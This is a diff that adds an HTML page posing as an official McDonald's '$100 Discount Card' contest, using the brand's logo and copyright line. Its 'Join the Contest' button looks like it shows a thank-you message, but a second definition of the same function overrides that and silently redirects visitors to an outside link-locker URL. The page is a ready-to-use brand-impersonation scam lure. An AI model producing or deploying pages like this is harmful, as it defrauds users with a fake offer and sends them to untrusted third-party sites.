@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>McDonald's $100 Discount Offer</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #ca2b2b;
+        }
+
+        .container {
+            text-align: center;
+            max-width: 500px;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .logo {
+            max-width: 150px;
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            font-size: 24px;
+            color: #d52b1e;
+            margin-bottom: 20px;
+            animation: fadeInDown 1s ease-out;
+        }
+
+        p {
+            font-size: 18px;
+            color: #030303;
+            margin-bottom: 20px;
+            animation: fadeInUp 1s ease-out;
+        }
+
+        .card-image {
+            max-width: 100%;
+            height: auto;
+            margin-bottom: 20px;
+            animation: bounceIn 1.5s ease-in-out;
+        }
+
+        button {
+            background-color: #d52b1e;
+            color: #fff;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 5px;
+            font-size: 18px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            animation: pulse 2s infinite;
+        }
+
+        button:hover {
+            background-color: #b12217;
+        }
+
+        footer {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #999;
+        }
+
+        @keyframes fadeInDown {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes bounceIn {
+            0% {
+                opacity: 0;
+                transform: scale(0.5);
+            }
+            60% {
+                opacity: 1;
+                transform: scale(1.1);
+            }
+            80% {
+                transform: scale(0.9);
+            }
+            100% {
+                transform: scale(1);
+            }
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.1);
+            }
+            100% {
+                transform: scale(1);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <img src="mc.png" alt="McDonald's Logo" class="logo">
+        </header>
+        <main>
+            <h1>Win a $100 Discount Card for McDonald's!</h1>
+            <p>Enjoy your first meal with your family at McDonald's with a $100 discount card. Join now!</p>
+            <img src="1.png" alt="Discount Card" class="card-image">
+            <button onclick="joinContest()">Join the Contest</button>
+
+        </main>
+        <footer>
+            <p>&copy; 2024 McDonald's. All rights reserved.</p>
+        </footer>
+    </div>
+    <script>
+        function joinContest() {
+            const button = document.querySelector("button");
+            button.innerText = "Thanks for Joining!";
+            button.style.backgroundColor = "#4caf50";
+            button.style.cursor = "default";
+            button.disabled = true;
+            alert("Thank you for joining the contest! You will be notified if you win.");
+         
+        }
+
+        function joinContest() {
+    window.location.href = "https://locked3.com/sl/78dok"}
+    </script>
+</body>
+</html>
